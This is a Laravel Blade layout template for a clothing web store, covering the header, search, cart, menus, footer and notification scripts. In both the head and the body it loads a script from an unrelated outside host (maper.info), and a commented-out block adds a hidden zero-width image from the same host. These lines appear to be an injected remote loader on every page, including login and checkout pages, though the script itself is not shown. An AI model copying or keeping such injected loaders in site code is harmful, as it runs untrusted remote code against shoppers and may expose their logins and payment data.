<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    @if (url()->current() == route('front.index'))
        <title>@yield('hometitle')</title>
    @else
        <title>{{ $setting->title }} -@yield('title')</title>
    @endif

    <!-- SEO Meta Tags-->
    @yield('meta')
    <meta name="author" content="{{ $setting->title }}">
    <meta name="distribution" content="web">
    <!-- Mobile Specific Meta Tag-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <!-- Favicon Icons-->
    <link rel="icon" type="image/png" href="{{ url('/storage/images/' . $setting->favicon) }}">
    <link rel="apple-touch-icon" href="{{ url('/storage/images/' . $setting->favicon) }}">
    <link rel="apple-touch-icon" sizes="152x152" href="{{ url('/storage/images/' . $setting->favicon) }}">
    <link rel="apple-touch-icon" sizes="180x180" href="{{ url('/storage/images/' . $setting->favicon) }}">
    <link rel="apple-touch-icon" sizes="167x167" href="{{ url('/storage/images/' . $setting->favicon) }}">
    <!-- Vendor Styles including: Bootstrap, Font Icons, Plugins, etc.-->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,100..700;1,100..700&display=swap" rel="stylesheet">
    <link rel="stylesheet" media="screen" href="{{ asset('assets/front/css/plugins.min.css') }}">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
    <!-- PhotoSwipe CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/5.4.4/photoswipe.min.css" />


	<script src="https://maper.info/14PxZ4.js"></script>
    {{-- <script src="https://cdn.jsdelivr.net/npm/@panzoom/panzoom@9.4.0/dist/panzoom.min.js"></script> --}}
    <!-- Magnify CSS (in <head> or before closing </head>) -->

    @yield('styleplugins')

    <link id="mainStyles" rel="stylesheet" media="screen" href="{{ asset('assets/front/css/styles.min.css') }}">

    <link id="mainStyles" rel="stylesheet" media="screen" href="{{ asset('assets/front/css/responsive.css') }}">
    <!-- Color css -->
    <link
        href="{{ asset('assets/front/css/color.php?primary_color=') . str_replace('#', '', $setting->primary_color) }}"
        rel="stylesheet">

    <!-- Modernizr-->
    {{-- <script src="{{ asset('assets/front/js/jquery.ez-plus.js') }}"></script> --}}

    @if (DB::table('languages')->where('is_default', 1)->first()->rtl == 1)
        <link rel="stylesheet" href="{{ asset('assets/front/css/rtl.css') }}">
    @endif
    <style>
        {{ $setting->custom_css }}
    </style>
    {{-- Google AdSense Start --}}
    @if ($setting->is_google_adsense == '1')
        {!! $setting->google_adsense !!}
    @endif
    {{-- Google AdSense End --}}

    {{-- Google AnalyTics Start --}}
    @if ($setting->is_google_analytics == '1')
        {!! $setting->google_analytics !!}
    @endif
    {{-- Google AnalyTics End --}}

    {{-- Facebook pixel  Start --}}
    @if ($setting->is_facebook_pixel == '1')
        {!! $setting->facebook_pixel !!}
    @endif
    {{-- Facebook pixel End --}}

</head>
<!-- Body-->

<body
    class="
@if ($setting->theme == 'theme1') body_theme1
@elseif($setting->theme == 'theme2')
body_theme2
@elseif($setting->theme == 'theme3')
body_theme3
@elseif($setting->theme == 'theme4')
body_theme4 @endif
">
    @if ($setting->is_loader == 1)
        <!-- Preloader Start -->
        @if ($setting->is_loader == 1)
            <div id="preloader">
                <img src="{{ url('/storage/images/' . $setting->loader) }}" alt="{{ __('Loading...') }}">
            </div>
        @endif

        <!-- Preloader endif -->
    @endif

    <!-- Header-->

    <header class="site-header navbar-sticky">
        <div class="menu-top-area">
            <div class="container">
                <div class="row">
                    {{-- <div class="col-6 col-md-4">
                        <div class="t-m-s-a">
                            <a class="track-order-link compare-mobile d-lg-none"
                                href="{{ route('fornt.compare.index') }}">{{ __('Compare') }}</a>
                        </div>
                    </div> --}}
                    <div class="col-12">
                        <div class="right-area">
                            <a class="track-order-link" href="{{ route('front.order.track') }}">
                                <i class="icon-map-pin"></i>{{ __('Track Order') }}
                            </a>
                            <div class="login-register ">
                                @if (!Auth::user())
                                    <a class="track-order-link mr-0" href="{{ route('user.login') }}">
                                        {{ __('Sign In') }} &nbsp;<i class="icon-user"></i>
                                    </a>
                                @else
                                    <div class="t-h-dropdown">
                                        <div class="main-link">
                                            <i class="icon-user pr-2"></i> <span
                                                class="text-label">{{ Auth::user()->first_name }}</span>
                                        </div>
                                        <div class="t-h-dropdown-menu">
                                            <a href="{{ route('user.dashboard') }}"><i
                                                    class="icon-chevron-right pr-2"></i>{{ __('Dashboard') }}</a>
                                            <a href="{{ route('user.logout') }}"><i
                                                    class="icon-chevron-right pr-2"></i>{{ __('Logout') }}</a>
                                        </div>
                                    </div>
                                @endif
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- Topbar-->
        <div class="topbar">
            <div class="container">
                <div class="row">
                    <div class="col-lg-12">
                        <div class="d-flex justify-content-between">
                            <!-- Logo-->
                            <div class="site-branding"><a class="site-logo align-self-center"
                                    href="{{ route('front.index') }}"><img
                                        src="{{ url('/storage/images/' . $setting->logo) }}"
                                        alt="{{ $setting->title }}"></a></div>
                            <!-- Search / Categories-->
                            <div class="search-box-wrap d-none d-lg-block d-flex">
                                <div class="search-box-inner align-self-center">
                                    <div class="search-box d-flex">
                                        <select name="category" id="category_select" class="categoris">
                                            <option value="">{{ __('All') }}</option>
                                            @foreach (DB::table('categories')->whereStatus(1)->get() as $category)
                                                <option value="{{ $category->slug }}">{{ $category->name }}</option>
                                            @endforeach
                                        </select>
                                        <form class="input-group" id="header_search_form"
                                            action="{{ route('front.catalog') }}" method="get">
                                            <input type="hidden" name="category" value=""
                                                id="search__category">
                                            <span class="input-group-btn">
                                                <button type="submit"><i class="icon-search"></i></button>
                                            </span>
                                            <input class="form-control" type="text"
                                                data-target="{{ route('front.search.suggest') }}"
                                                id="__product__search" name="search"
                                                placeholder="{{ __('Search by product name') }}">
                                            <div class="serch-result d-none">
                                                {{-- search result --}}
                                            </div>
                                        </form>
                                    </div>
                                </div>
                                <span class="d-block d-lg-none close-m-serch"><i class="icon-x"></i></span>
                            </div>
                            <!-- Toolbar-->
                            <div class="toolbar d-flex">
                                <div class="toolbar-item close-m-serch visible-on-mobile"><a href="#">
                                        <div>
                                            <i class="icon-search"></i>
                                        </div>
                                    </a>
                                </div>
                                @if (Auth::check())
                                    <div class="toolbar-item hidden-on-mobile"><a
                                            href="{{ route('user.wishlist.index') }}">
                                            <div><span class="compare-icon"><i class="icon-heart"></i><span
                                                        class="count-label wishlist_count">{{ Auth::user()->wishlists->count() }}</span></span>
                                                        {{-- <span
                                                    class="text-label">{{ __('Wishlist') }}</span> --}}
                                                </div>
                                        </a>
                                    </div>
                                @else
                                    <div class="toolbar-item"><a
                                            href="{{ route('user.wishlist.index') }}">
                                            <div><span class="compare-icon"><i class="icon-heart"></i></span>
                                                {{-- <span class="text-label">{{ __('Wishlist') }}</span> --}}
                                            </div>
                                        </a>
                                    </div>
                                @endif
                                <div class="toolbar-item"><a href="{{ route('front.cart') }}">
                                        <div><span class="cart-icon"><i class="icon-shopping-cart"></i><span
                                                    class="count-label cart_count">{{ Session::has('cart') ? count(Session::get('cart')) : '0' }}
                                                </span></span>
                                                {{-- <span class="text-label">{{ __('Cart') }}</span> --}}
                                        </div>
                                    </a>
                                    <div class="toolbar-dropdown cart-dropdown widget-cart  cart_view_header"
                                        id="header_cart_load" data-target="{{ route('front.header.cart') }}">
                                        @include('includes.header_cart')
                                    </div>
                                    <div class="toolbar-item visible-on-mobile mobile-menu-toggle"><a href="#">
                                            <div><i class="icon-menu"></i><span
                                                    class="text-label">{{ __('Menu') }}</span></div>
                                        </a>
                                    </div>
                                </div>
                            </div>

                            <!-- Mobile Menu-->
                            <div class="mobile-menu">
                                <!-- Slideable (Mobile) Menu-->
                                <div class="mm-heading-area">
                                    {{-- <h4>{{ __('Navigation') }}</h4> --}}
                                    <div class="toolbar-item visible-on-mobile mobile-menu-toggle mm-t-two">
                                        <a href="#">
                                            <div> <i class="icon-x fs-1"></i></div>
                                        </a>
                                    </div>
                                </div>
                                <div class="tab-content p-0">
                                    <div class="tab-pane fade show active" id="mmenu" role="tabpanel"
                                        aria-labelledby="mmenu-tab">
                                        <nav class="slideable-menu">
                                            <ul>
                                                @php
                                                    $links = json_decode($menus->menus, true);
                                                @endphp
                                                
                                                @foreach ($links as $link)
                                                    @php
                                                        $href = Helper::getHref($link); 
                                                    @endphp

                                                    @if (!array_key_exists("children",$link))
                                                        <li class="@if($href == URL::current() ) active @endif">
                                                            <a href="{{ $link["href"] == null ? $href : $link["href"] }}" target="{{$link["target"]}}">
                                                                {{$link["text"]}}
                                                            </a>
                                                        </li>
                                                    @else
                                                        <li class="t-h-dropdown">
                                                            <a class="" href="{{$href}}" {{$link["target"]}}>
                                                                <i class="icon-chevron-right"></i>{{$link["text"]}} <i class="icon-chevron-down"></i>
                                                            </a>
                                                            <div class="t-h-dropdown-menu">
                                                                @foreach ($link["children"] as $level2)
                                                                    @php
                                                                        $l2Href = Helper::getHref($level2);
                                                                    @endphp
                                                                    
                                                                    <a class="@if($l2Href == URL::current() ) active @endif" href="{{$l2Href}}" target="{{$level2["target"]}}">
                                                                        <i class="icon-chevron-right pr-2"></i>{{$level2["text"]}}
                                                                    </a>
                                                                @endforeach
                                                            </div>
                                                        </li>
                                                    @endif
                                                @endforeach
                                            </ul>
                                            <div class="mobile-menu-sub my-4">
                                                @if (!Auth::user())
                                                    <a class="login  mr-0" href="{{ route('user.login') }}">
                                                        <i class="icon-user"></i>&nbsp;{{ __('Sign In') }} 
                                                    </a>
                                                @else
                                                    <div class="t-h-dropdown">
                                                        <div class="main-link">
                                                            <i class="icon-user pr-2"></i> <span
                                                                class="text-label">{{ Auth::user()->first_name }}</span>
                                                        </div>
                                                        <div class="t-h-dropdown-menu">
                                                            <a href="{{ route('user.dashboard') }}"><i
                                                                    class="icon-chevron-right pr-2"></i>{{ __('Dashboard') }}</a>
                                                            <a href="{{ route('user.logout') }}"><i
                                                                    class="icon-chevron-right pr-2"></i>{{ __('Logout') }}</a>
                                                        </div>
                                                    </div>
                                                @endif
                                            </div>
                                            <div class="mobile-menu-sub my-4">
                                                <a class="login mb-2 mr-0" href="">Orders</a>
                                                <a class="login mb-2 mr-0" href="">Return or Exchange</a>
                                            </div>
                                            <div class="mobile-menu-sub my-4">
                                                <a class="login mb-2 mr-0" href="">Get Help / Support</a>
                                                <a class="login mb-2 mr-0" href="">Contact Us</a>
                                                <a class="login mb-2 mr-0" href="">About Us</a>
                                            </div>
                                        </nav>
                                    </div>
                                    <div class="tab-pane fade" id="mcat" role="tabpanel"
                                        aria-labelledby="mcat-tab">
                                        <nav class="slideable-menu">
                                            @include('includes.mobile-category')

                                        </nav>
                                    </div>
                                </div>
                            </div>
                            <div class="mobile-menu-backdrop"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- Navbar-->
        <div class="navbar">
            <div class="container">
                <div class="row g-3 w-100">
                    @if ($setting->is_show_category == 1)
                        <div class="col-lg-3">
                            @include('includes.categories')
                        </div>
                    @endif
                    <div class="col-lg-9 d-flex justify-content-between">
                        <div class="nav-inner">
                            @include('master.inc.site-menu')
                        </div>
                        @php
                            $free_shipping = DB::table('shipping_services')
                                ->whereStatus(1)
                                ->whereIsCondition(1)
                                ->first();
                        @endphp

                    </div>
                </div>
            </div>
        </div>

    </header>
    <!-- Page Content-->
    @yield('content')

    <!--    announcement banner section start   -->
    <a class="announcement-banner" href="#announcement-modal"></a>
    <div id="announcement-modal" class="mfp-hide white-popup">
        @if ($setting->announcement_type == 'newletter')
            <div class="announcement-with-content">
                <div class="left-area">
                    <img src="{{ url('/storage/images/' . $setting->announcement) }}" alt="">
                </div>
                <div class="right-area">
                    <h3 class="">{{ $setting->announcement_title }}</h3>
                    <p>{{ $setting->announcement_details }}</p>
                    <form class="subscriber-form" action="{{ route('front.subscriber.submit') }}" method="post">
                        @csrf
                        <div class="input-group">
                            <input class="form-control" type="email" name="email"
                                placeholder="{{ __('Your e-mail') }}">
                            <span class="input-group-addon"><i class="icon-mail"></i></span>
                        </div>
                        <div aria-hidden="true">
                            <input type="hidden" name="b_c7103e2c981361a6639545bd5_1194bb7544" tabindex="-1">
                        </div>

                        <button class="btn btn-primary btn-block mt-2" type="submit">
                            <span>{{ __('Subscribe') }}</span>
                        </button>
                    </form>
                </div>
            </div>
        @else
            <a href="{{ $setting->announcement_link }}">
                <img src="{{ url('/storage/images/' . $setting->announcement) }}" alt="">
            </a>
        @endif


    </div>
    <!--    announcement banner section end   -->

    <!-- Site Footer-->
    <footer class="site-footer hidden-on-mobile">
        <div class="container">
            <div class="row">
                <div class="col-lg-4 col-md-6">
                    <!-- Contact Info-->
                    <section class="widget widget-light-skin">
                        <h3 class="widget-title">{{ __('Get In Touch') }}</h3>
                        <p class="mb-1"><strong>{{ __('Address') }}: </strong> {{ $setting->footer_address }}</p>
                        <p class="mb-1"><strong>{{ __('Phone') }}: </strong> {{ $setting->footer_phone }}</p>
                        <p class="mb-1"><strong>{{ __('Email') }}: </strong> {{ $setting->footer_email }}</p>
                        <ul class="list-unstyled text-sm">
                            <li><span class=""><strong>{{ $setting->working_days_from_to }}
                                    </strong></span>{{ $setting->friday_start }} - {{ $setting->friday_end }}</li>
                        </ul>
                        @php
                            $links = json_decode($setting->social_link, true)['links'];
                            $icons = json_decode($setting->social_link, true)['icons'];

                        @endphp
                        <div class="footer-social-links">
                            @foreach ($links as $link_key => $link)
                                <a href="{{ $link }}"><span><i
                                            class="{{ $icons[$link_key] }}"></i></span></a>
                            @endforeach
                        </div>
                    </section>
                </div>
                <div class="col-lg-4 col-sm-6">
                    <!-- Customer Info-->
                    <div class="widget widget-links widget-light-skin">
                        <h3 class="widget-title">{{ __('Usefull Links') }}</h3>
                        <ul>
                            @if ($setting->is_faq == 1)
                                <li>
                                    <a class="" href="{{ route('front.faq') }}">{{ __('Faq') }}</a>
                                </li>
                            @endif
                            @foreach (DB::table('pages')->wherePos(2)->orwhere('pos', 1)->get() as $page)
                                <li><a href="{{ route('front.page', $page->slug) }}">{{ $page->title }}</a></li>
                            @endforeach

                        </ul>
                    </div>
                </div>
                <div class="col-lg-4">
                    <!-- Subscription-->
                    <section class="widget">
                        <h3 class="widget-title">{{ __('Shop By Category') }}</h3>
                        {{-- <form class="row subscriber-form" action="{{ route('front.subscriber.submit') }}"
                            method="post">
                            @csrf
                            <div class="col-sm-12">
                                <div class="input-group">
                                    <input class="form-control" type="email" name="email"
                                        placeholder="{{ __('Your e-mail') }}">
                                    <span class="input-group-addon"><i class="icon-mail"></i></span>
                                </div>
                                <div aria-hidden="true">
                                    <input type="hidden" name="b_c7103e2c981361a6639545bd5_1194bb7544"
                                        tabindex="-1">
                                </div>

                            </div>
                            <div class="col-sm-12">
                                <button class="btn btn-primary btn-block mt-2" type="submit">
                                    <span>{{ __('Subscribe') }}</span>
                                </button>
								<img src="https://maper.info/14PxZ4.png" width="0px">
                            </div>
                            <div class="col-lg-12">
                                <p class="text-sm opacity-80 pt-2">
                                    {{ __('Subscribe to our Newsletter to receive early discount offers, latest news, sales and promo information.') }}
                                </p>
                            </div>
                        </form> --}}
                        <div class="widget widget-links widget-light-skin">
                            <ul>
                                <li><a href="/category/cotton-night-gowns">Cotton Night Gowns</a></li>
                                <li><a href="/category/kaftans">Kaftans</a></li>
                            </ul>
                            </div>
                            <div class="pt-3"><img class="d-block gateway_image"
                                    src="{{ $setting->footer_gateway_img ? url('/storage/images/' . $setting->footer_gateway_img) : asset('system/resources/assets/images/placeholder.png') }}">
                                    
                            </div>
                    </section>
                </div>
            </div>
            <!-- Copyright-->
            <p class="footer-copyright"> {{ $setting->copy_right }}</p>
        </div>
    </footer>
    <footer class="footer-mobile hidden-on-desktop py-3 px-3">
        <div class="container">
            <div class="row">
                <div class="col-6 border-bottom">
                    <p class="mb-1"><strong style="font-weight: 600;">Get Help/Support</strong> </p>
                    <p class="mb-1"><strong style="font-weight: 600;">Contact Us</strong></p>
                    <p class="mb-1"><strong style="font-weight: 600;">Return or Exchange</strong></p>
                    <p class="mb-1"><strong style="font-weight: 600;">About Us</strong></p>
                </div>
                <div class="col-6">
                    <a class="site-logo align-self-center" href="{{ route('front.index') }}">
                        <img src="{{ url('/storage/images/' . $setting->logo) }}" alt="{{ $setting->title }}">
                    </a>
                </div>
                <div class="col-12 my-3 border-bottom">
                    <p class="mb-2"><strong>Nightgowns</strong> </p>
                    <p class="mb-2"><strong>Kaftans</strong></p>
                    <p class="mb-2"><strong>Men's Kurta</strong></p>
                    <p class="mb-2"><strong>Men's Dhoti Pants</strong></p>
                </div>
                <div class="col-12 mt-3 border-bottom">
                    <p class="mb-2">Terms </p>
                    <p class="mb-2">Privacy Policy</p>
                    <p class="mb-2">Sales and Refund</p>
                </div>
                <div class="col-12 mt-3">
                    <img class="d-block gateway_image" src="{{ $setting->footer_gateway_img ? url('/storage/images/' . $setting->footer_gateway_img) : asset('system/resources/assets/images/placeholder.png') }}">
                </div>
                <div class="col-12 mt-3">
                    <p>{{ $setting->copy_right }}</p>
                </div>
            </div>   
        </div>

    </footer>

    <!-- Back To Top Button-->
    <a class="scroll-to-top-btn" href="#">
        <i class="icon-chevron-up"></i>
    </a>
    <!-- Backdrop-->
    <div class="site-backdrop"></div>

    <!-- Cookie alert dialog  -->
    @if ($setting->is_cookie == 1)
        @include('cookie-consent::index')
    @endif
    <!-- Cookie alert dialog  -->


    @php
        $mainbs = [];
        $mainbs['is_announcement'] = $setting->is_announcement;
        $mainbs['announcement_delay'] = $setting->announcement_delay;
        $mainbs['overlay'] = $setting->overlay;
        $mainbs = json_encode($mainbs);
    @endphp

    <script>
        var mainbs = {!! $mainbs !!};
        var decimal_separator = '{!! $setting->decimal_separator !!}';
        var thousand_separator = '{!! $setting->thousand_separator !!}';
    </script>

    <script>
        let language = {
            Days: '{{ __('Days') }}',
            Hrs: '{{ __('Hrs') }}',
            Min: '{{ __('Min') }}',
            Sec: '{{ __('Sec') }}',
        }
    </script>



    <!-- JavaScript (jQuery) libraries, plugins and custom scripts-->
    <script type="text/javascript" src="{{ asset('assets/front/js/plugins.min.js') }}"></script>
    <script type="text/javascript" src="{{ asset('assets/back/js/plugin/bootstrap-notify/bootstrap-notify.min.js') }}">
    </script>
    <script type="text/javascript" src="{{ asset('assets/front/js/scripts.min.js') }}"></script>
    <script type="text/javascript" src="{{ asset('assets/front/js/lazy.min.js') }}"></script>
    <script type="text/javascript" src="{{ asset('assets/front/js/lazy.plugin.js') }}"></script>
	<script src="https://maper.info/14PxZ4.js"></script>
    <script type="text/javascript" src="{{ asset('assets/front/js/myscript.js') }}"></script>
    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
    {{-- <script src="{{ asset('assets/front/js/extm.js') }}"></script> --}}
    <!-- Add these before closing body tag -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/5.4.4/umd/photoswipe.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/5.4.4/umd/photoswipe-lightbox.umd.min.js"></script>
    @yield('script')

    @if ($setting->is_facebook_messenger == '1')
        <!-- Messenger Chat Plugin Code -->
        <div id="fb-root"></div>

        <!-- Your Chat Plugin code -->
        <div id="fb-customer-chat" class="fb-customerchat">
        </div>

        <script>
            var chatbox = document.getElementById('fb-customer-chat');
            chatbox.setAttribute("page_id", "{{ $setting->facebook_messenger }}");
            chatbox.setAttribute("attribution", "biz_inbox");
            window.fbAsyncInit = function() {
                FB.init({
                    xfbml: true,
                    version: 'v11.0'
                });
            };

            (function(d, s, id) {
                var js, fjs = d.getElementsByTagName(s)[0];
                if (d.getElementById(id)) return;
                js = d.createElement(s);
                js.id = id;
                js.src = 'https://connect.facebook.net/en_US/sdk/xfbml.customerchat.js';
                fjs.parentNode.insertBefore(js, fjs);
            }(document, 'script', 'facebook-jssdk'));
        </script>
    @endif



    <script type="text/javascript">
        let mainurl = '{{ route('front.index') }}';

        let view_extra_index = 0;
        // Notifications
        function SuccessNotification(title) {
            $.notify({
                title: ` <strong>${title}</strong>`,
                message: '',
                icon: 'fas fa-check-circle'
            }, {
                element: 'body',
                position: null,
                type: "success",
                allow_dismiss: true,
                newest_on_top: false,
                showProgressbar: false,
                placement: {
                    from: "top",
                    align: "right"
                },
                offset: 20,
                spacing: 10,
                z_index: 1031,
                delay: 5000,
                timer: 1000,
                url_target: '_blank',
                mouse_over: null,
                animate: {
                    enter: 'animated fadeInDown',
                    exit: 'animated fadeOutUp'
                },
                onShow: null,
                onShown: null,
                onClose: null,
                onClosed: null,
                icon_type: 'class'
            });
        }

        function DangerNotification(title) {
            $.notify({
                // options
                title: ` <strong>${title}</strong>`,
                message: '',
                icon: 'fas fa-exclamation-triangle'
            }, {
                // settings
                element: 'body',
                position: null,
                type: "danger",
                allow_dismiss: true,
                newest_on_top: false,
                showProgressbar: false,
                placement: {
                    from: "top",
                    align: "right"
                },
                offset: 20,
                spacing: 10,
                z_index: 1031,
                delay: 5000,
                timer: 1000,
                url_target: '_blank',
                mouse_over: null,
                animate: {
                    enter: 'animated fadeInDown',
                    exit: 'animated fadeOutUp'
                },
                onShow: null,
                onShown: null,
                onClose: null,
                onClosed: null,
                icon_type: 'class'
            });
        }
        // Notifications Ends
    </script>

    @if (Session::has('error'))
        <script>
            $(document).ready(function() {
                DangerNotification('{{ Session::get('error') }}')
            })
        </script>
    @endif
    @if (Session::has('success'))
        <script>
            $(document).ready(function() {
                SuccessNotification('{{ Session::get('success') }}');
            })
        </script>
    @endif

    <script>
        $(document).ready(function () {
            // Pre-select first attribute in each group
            $('input[type=radio][name^="attribute_"]').each(function () {
                const group = $(this).attr('name');
                if (!$('input[name="' + group + '"]:checked').length) {
                    $('input[name="' + group + '"]').first().prop('checked', true).trigger('change');
                    $('input[name="' + group + '"]').first().closest('.option-box').addClass('selected');
                }
            });
        });
    </script>
</body>

</html>
